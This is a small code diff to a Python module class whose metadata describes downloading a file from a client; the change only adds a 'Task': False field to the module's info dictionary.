@@ -8,7 +8,8 @@ class Module:
         self.info = {
             "Author": ["Marten4n6"],
             "Description": "Download a file from the client.",
-            "References": []
+            "References": [],
+            "Task": False
         }
         self.download_file = None
         self.output_folder = None
